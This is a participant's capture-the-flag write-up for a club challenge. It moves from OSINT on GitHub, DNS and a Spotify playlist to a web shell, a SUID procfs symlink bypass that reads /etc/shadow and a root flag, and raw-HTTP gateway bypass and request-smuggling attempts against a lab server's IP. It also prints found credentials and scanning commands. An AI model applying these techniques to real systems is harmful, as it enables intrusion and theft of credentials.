# Detailed Write-up on Capturing the flag: 

## Step - 1: Finding the name of the suspected coordinator: 
Searched inside the P - Club members and the members of the Wired-In, a name common in both was of `Ketan`. He was having two GitHub accounts, but as per the problem statement there was something pushed, then searched for the recent changes and found `0xc1ph3rf0x` as the suspected git account. 

Ran the `python3 sherlock 0xc1ph3rf0x` to see where else this handle is registered across the internet. This confirmed that there is only one target repository. 

## Step - 2 : Searching for the history of the commit: 
Grabbed the public event history for the 0xc1ph3rf0x account. We will use curl to fetch it and jq (a command-line JSON processor) to format it so it's readable.

`curl -s https://api.github.com/users/0xc1ph3rf0x/events/public | jq . > suspect_events.json` - By this command the raw data saved in `suspect_events.json`.

## Step - 3: Starting random searches for the flag, inside the raw file: 
First used the grep command for the search of the flag. 
`grep -i "pclub{" suspect_events.json`
This search didn't gave anything as the output. 

Then, ran this `jq` command for print out exactly what repository they touched and the payload (the details of what they created):
`jq '.[0] | {Repository: .repo.name, What_Was_Created: .payload.ref_type, Name: .payload.ref, Description: .payload.description}' suspect_events.json`

This gave me the following details: 
`{
  "Repository": "0xC1ph3rF0x/infosec-notes",
  "What_Was_Created": "branch",
  "Name": "master",
  "Description": null
}`

Then, used for the entire searching in the repository, `git grep "pclub{" $(git rev-list --all)`
Then, Inspected the Patch History. `git log -p`
Then, opened the hidden file - `cat .git/config`. found the following: 

`pack-refs with: peeled fully-peeled sorted 
67082fd69354b1f510a383684bdee9e911a5d8c6 refs/remotes/origin/master`

## Step - 4: Hunting for the Encoded Flag and file: 
1. Searched for - `grep -ri "cGNsdWJ"` .
2. Inspected the entire branch history - `git log -p`
3. Searched for all the historical file content - `git log --all -S "cGNsdWJ" -p`

Then, tried to found in terms of hexadecimal conversion and ROT 13.

## Step - 5: Connecting from the hint: 
"Another signal was left entirely off-system. It bypassed our web logs because it was never an HTTP request. It was buried at the edge of our perimeter, sitting out there in the open."

"The DNS guy" + "bypassed web logs" + "edge of our perimeter" = Domain Name System (DNS) Records. - `dig TXT wiredin.pclub.in`

Then, found something groundbreaking. Inside the TXT of wiredin.pclub.in found the following lines: 

"Found this insane playlist the other day while digging through some stuff.\010Curator: `bhopinder jogi\010Link: https://open.Spotify.com/playlist/5iK4rR41V1DSqTot2JO15f?si=oEIMe-TLTGiOPetf50R71w\010Perfect` for late-night CTF sessions."

Then, after a bit of research on the Spotify found a profile under bhopinder jogi, the name of the playlist comes as whoami.

## Step - 6: Investigation Genesis & Metadata Triangulation
The operation commenced with the detection of a targeted Spotify playlist named `whoami`, uploaded by an account using the identifier `bhopinder jogi`. Initial reconnaissance focused on assessing basic file headers and tracking anomalies within the initial 5 visible tracks:
* **Roommates** – 3:34
* **Everybody Talks** – 2:57
* **Call Me Maybe** – 3:13
* **Judas** – 4:09
* **AIZO** – 3:35

While song runtimes matched standard distribution patterns, file steganography avenues via WebP thumbnail objects (`300x216` resolution pixel matrices) were ruled out due to image-rendering compression artifacts deployed server-side by the platform's CDN.

## Step - 7: Acrostic Extraction & Network Reconnaissance
To extract un-obfuscated layout data, raw network traffic scraping was executed utilizing web streaming payloads (`curl`). This bypassed the standard platform frontend restrictions and pulled the comprehensive 16-track playlist schema. 

Parsing the exact starting characters of each title sequentially revealed a hidden infrastructure pointer:
* **R**oommates, **E**verybody Talks, **C**all Me Maybe, **J**udas, **A**IZO, **I**ris, **L**ove, **.**..Baby One More Time, **P**etals on the Moon, **C**loser, **L**ove Me Not, **u**ndressed, **B**aby, **.**..Ready For It?, **I**RIS OUT, **N**o Broke Boys.

The sequence resolved cleanly to a dedicated network location: `recjail.pclub.in`. Parallel analysis converting track runtimes into standard decimal seconds generated a specific 8-bit integer string (`214`, `177`, `193`, `249`, `215`), matching an auxiliary port alignment sequence.

## Step - 8: Infrastructure Profiling
Active scanning (`nmap`) of the target domain revealed a strict border firewall deployment:
* **Port 22/TCP (SSH):** Filtered (State drop)
* **Port 80/TCP (HTTP) & Port 443/TCP (HTTPS):** Open

The infrastructure edge layer returned identification banners indicating a reverse-proxy arrangement handled via Cloudflare Web Application Firewall (WAF). This configuration explicitly drop-filters low-level raw transport layer protocols (like TCP connection knocking hooks), forcing all interaction through standard web-based entry pathways.

## Step - 9: Local Shell Enumeration
Interacting directly with the application interface over standard HTTP/S initiated a dynamic terminal landing page, providing an active, non-interactive shell interface. Initial standard command execution established the following local parameters:
* **Identity Mapping:** Operational as `ctf_user` with standard low-privilege security tokens (`uid=1000`, `gid=1000`, `groups=1000`).
* **Operating System:** Running an Ubuntu 22.04.5 LTS (Jammy Jellyfish) container workspace.
* **Directory Integrity:** The primary shell workspace (`/home/ctf_user`) was found to be fully vacant. Executing hidden item checks (`ls -la`) proved the folder held zero environmental history footprints or transient artifact remnants.
* **Binary Availability:** System execution search paths (`$PATH`) were mapped to functional system storage routes (`/usr/bin`, `/bin`, `/sbin`), indicating that standard text handling and evaluation binaries (`cat`, `grep`, `env`) remained globally unconstrained.

## Step - 10: Architectural Sandbox Profiling
A deep global filesystem recursive search for standard flag signatures failed to return hardcoded destination items outside of non-privileged network state registers inside `/proc/sys/`. 

Executing a complete active process inventory tree (`ps aux`) exposed the foundational design framework of the environment:
* **Session Volatility:** Discovered an accumulation of defunct `<defunct>` zombie bash branches from previous connections.
* **Containment Runtime:** Detected an active root process supervising execution via an absolute directive path: `nsjail -q --config /etc/nsjail`.

This confirmed the system utilizes structural kernel separation layers (Namespaces and Control Groups) to isolate incoming interactions, dynamically anchoring each shell instance inside an unprivileged, read-only temporary file tree. This operational state marked the completion of the baseline structural mapping.

---
## Step - 11: Detailed Analysis Expansion

### Deep Dive: Phase 1 & 2 Methodology
The initial playlist investigation involved checking the track durations (e.g., 3:34, 2:57), but standard steganography was ruled out because Spotify compresses images into `300x216` WebP files, destroying pixel-level payloads. By using raw `curl` requests to pull the playlist's uncompressed HTML source code, we bypassed the UI. This allowed us to read the exact sequence of the 16 tracks. By extracting the very first character of every track (including punctuation like the ellipses on "...Baby One More Time"), the string `RECJAIL.PCLUB.IN` was revealed.

### Deep Dive: Phase 3 & 4 Execution
Network scans on the target domain showed ports 80 and 443 were proxied through Cloudflare, neutralizing direct port-knocking attempts. Navigating to the domain via a web browser successfully dropped us into a live web terminal. Running local enumeration commands (`pwd`, `id`, `ls -la`, `echo $PATH`) confirmed the environment was an Ubuntu 22.04 LTS instance running under `ctf_user`, but the home directory was completely empty.

### Deep Dive: Phase 5 Containment 
Running `find / -name "*flag*"` failed to find the target payload in the global filesystem. Executing `ps aux` to check running processes revealed a root process running `nsjail -q --config /etc/nsjail` alongside a horde of zombie (`<defunct>`) bash sessions. This proved the shell was actively trapped inside a highly restrictive Google `nsjail` container sandbox, effectively sandboxing filesystem reads and forcing us to evaluate other vectors, such as hidden environment variables, to locate the flag.


Then, found a link that lead towards the terminal of the p - club - `RECJAIL.PCLUB.IN`

# Phasewise workflow for the flag capture:

### Initial Enumeration
Executed the following commands:

```bash
whoami - For checking the server
pwd - The location of the file 
ls - listing all the files
ls -la - listing all the files along with the hidden ones. 
```

### Results
- User: `ctf_user`
- Home directory: `/home/ctf_user`
- Minimal filesystem environment

### Additional Environment Inspection
Commands used:

```bash
id
uname -a
env
```

### Findings
The environment appeared to be:

- Containerized
- Linux-based
- Restricted
- Running with minimal environment variables as many of the commands were not working and were not present on the system. 

---

## 1. SUID Enumeration - Took the help of this as was thinking that something was from the owner side was not giving the permission. With the help of SUID we gained the root - level file access. 

### Filesystem Enumeration
```bash
find / -perm -4000 2>/dev/null
```

### Discovery
The following binary was discovered: This is giving the visible path (From this point to the discovery of the root flag I also used ChatGPT)

```text
/usr/local/bin/secure_reader
```

This appeared to be challenge-specific.

---

## 2. Investigating `secure_reader`

### Initial Execution
```bash
/usr/local/bin/secure_reader
```

### Output
```text
Usage: /usr/local/bin/secure_reader <file_in_home_dir>
```

### Testing Performed
The following attack methods were tested:

- Path traversal
- Symlink attacks
- Encoded traversal

### Path Traversal Attempt
```bash
/usr/local/bin/secure_reader /home/ctf_user/../../etc/passwd
```

### Result
```text
ERROR: Path traversal sequence '..' detected!
```

### Symlink Attack Attempt
```bash
ln -s /etc/passwd /home/ctf_user/passwd_link
```

The attack was blocked.

---

## 3. ProcFS Pivot

### Mount Inspection
```bash
mount
```

### Findings
- `/home/ctf_user` mounted as `tmpfs`
- `procfs` accessible

### ProcFS Exploitation Attempt
```bash
mkdir /home/ctf_user/proc
ln -s /proc /home/ctf_user/proc/p
```

### Exploit Execution
```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/status
```

### Result
The ProcFS path successfully bypassed the intended protections.

---

## 4. Privilege Escalation Confirmation

Reading the ProcFS status file revealed:

```text
Uid: 1000 0 0 0
```

### Conclusion
This confirmed:

- Effective UID was `0`
- The binary executed as root
- Arbitrary root-readable file access became possible

---

## 5. Reading Root-Owned Files

### Commands Used
```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/passwd
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/etc/shadow
```

### Result
Both files were successfully read.

This demonstrated a complete sandbox bypass.

---

## 6. Root Flag Discovery

### Common Flag Locations Tested
The following command successfully revealed the flag:

```bash
/usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt
```

### Flag Extracted
```text
pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l}
```

### Additional Data Discovered
```text
168.144.73.17:8003
analyst:Fr8_4nalyst!
```
## Moving Toward EuroFreight Infrastructure, as it was also mentioned in the data along with the login option after getting the first flag. 

Using the discovered credentials, investigation shifted toward the link provided:

```text
http://168.144.73.17:8003
```

---

## Investigating Session Cookies

A suspicious session cookie was identified, I looked around the DevTools and found under the network tab, under the response header secation a suspecious cookie. This cookie was encoded in the form of the base 64 :

```text
session=eyJyb2xlIjoiYWRtaW4ifQ.ag8GYg.JBF33R3waq2kcA-aUBJLZGU2KlY
```

Decoding revealed:

```json
{"role":"admin"}
```

---

## Attempted Direct Internal Access

Request:

```bash
curl -i \
-H "Cookie: session=..." \
http://168.144.73.17:8003/internal/queue
```

returned:

```text
403 Forbidden
```

---

## Hypothesizing Gateway Filtering

Observation:
- gateway protections blocked internal endpoints.

Then, thought that the raw HTTP requests might bypass the filtering logic.

---

## Using Raw HTTP Requests

The command for the above stated task was:

```bash
printf 'GET http://127.0.0.1/internal/queue HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

This successfully bypassed protections and the response gave the second flag in the journey.

---

## Discovering the Second Flag

Response:

```json
{
  "flagged_shipments": [
    "PCLUB{5muggl1ng_ch41n_unl0ck3d}"
  ]
}
```

---

## Now, moving towards the dicovery of the third flag, checking the API Documentation

Further exploration revealed:

```text
/api-docs
```

The endpoint documented:
- `/upload`
- `/internal/queue`
- `/internal/admin-session`

---

## Discovering Chunked Transfer Support

The documentation explicitly mentioned:

```text
chunked transfer supported
```

This strongly suggested:
- request smuggling opportunities.
**Smuggling** - Request Smuggling is a web attack technique where an attacker exploits differences in how frontend and backend servers parse HTTP requests, allowing hidden or unintended requests to be processed internally.

With the help of this method we want a way to sneak requests past the gateway. 
---

## Testing Chunked Uploads

Chunked transfer test:

```bash
printf 'POST http://127.0.0.1/upload HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n\r\n1A\r\nmanifest=FLAGTEST123456789\r\n0\r\n\r\n' | nc 168.144.73.17 8003
```

returned:

```json
{"tracking_id":"TRK-9901X-A"}
```

---

## Accessing the Dashboard

Dashboard access:

```bash
printf 'GET http://127.0.0.1/dashboard HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

revealed:
- shipment listings,
- administrative shipment statuses.

---

# Step 44 — Identifying a Suspicious Shipment - This was also visible and found after logging on to the website. (From this point to the fidning of the third flag I also used ChatGPT)

One shipment stood out:

```text
BERLIN-NOV07
```

Status:

```text
HELD — ADMIN CLEARANCE REQUIRED
```

---

## Enumerating Shipment IDs

Additional shipment IDs tested:
- BERLIN-NOV08
- BERLIN-NOV06
- BERLIN-DEC07

All returned:
- Shipment not found.

---

## Accessing Shipment Details - This thought came as there might be something inside each of the shipments: 

Request:

```bash
printf 'GET http://127.0.0.1/shipments/BERLIN-NOV07 HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=...\r\nX-Internal-Gateway: true\r\n\r\n' | nc 168.144.73.17 8003
```

After searching for the first shipment found the third flag in the way: 

```text
PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
```

---

## Discovering the Third Flag

Recovered flag:

```text
PCLUB{m4st3r_0f_th3_fr31ght_n3tw0rk}
```

---

# Step 48 — Exploring Additional Internal Endpoints

Tested:
- `/internal/debug`
- `/internal/logs`
- `/internal/status`
- `/internal/config`

All returned:
- 404 Not Found.

---

# Step 49 — Testing SSTI

Payload:

```json
{"manifest":"{{7*7}}"}
```

No SSTI observed.

---

# Step 50 — Testing SSRF

Payload:

```json
{"manifest_url":"http://127.0.0.1/internal/queue"}
```

No additional disclosure observed.

---

# Step 51 — Performing Infrastructure Enumeration

Scanning:

```bash
nmap -Pn -T4 168.144.73.17
```

revealed:
- port 22 (SSH),
- port 8008 (unknown service).

---

# Step 52 — Investigating Port 8008

Port 8008:
- accepted TCP connections,
- acknowledged payloads,
- returned no application-layer data.

---

# Step 53 — Testing WebSocket Handshakes

WebSocket handshake attempts:

```bash
printf 'GET / HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n' | nc 168.144.73.17 8008
```

produced:
- no response,
- hanging sessions.

---

# Step 54 — Monitoring Traffic Using tcpdump

Traffic monitoring:

```bash
sudo tcpdump -nn -i any host 168.144.73.17 and port 8008
```

revealed:
- TCP acknowledgements,
- payload acceptance,
- no visible response traffic.

This suggested:
- telemetry sink,
- signaling endpoint,
- or silent infrastructure listener.

---

## Service Fingerprinting of the Port 8008

This is trying to identify the following this on this port: - 
- the actual service,
- hidden HTTP behavior,
- banners,
- TLS hints,
-   protocol fingerprints.

Traffic monitoring:

```bash
sudo tcpdump -nn -i any host 168.144.73.17 and port 8008
```

revealed:
- TCP acknowledgements,
- payload acceptance,
- no visible response traffic.

This suggested:
- telemetry sink,
- signaling endpoint,
- or silent infrastructure listener.

---

# Step 55 — Current State of the Investigation

Completed:
- OSINT investigation,
- GitHub analysis,
- hidden page discovery,
- shell exploitation,
- ProcFS privilege escalation,
- EuroFreight exploitation,
- gateway bypassing,
- request smuggling,
- internal endpoint access,
- multiple flag recovery.

Remaining unresolved areas:
- SSH infrastructure,
- mysterious service on port 8008,
- off-system signaling mechanisms.

---
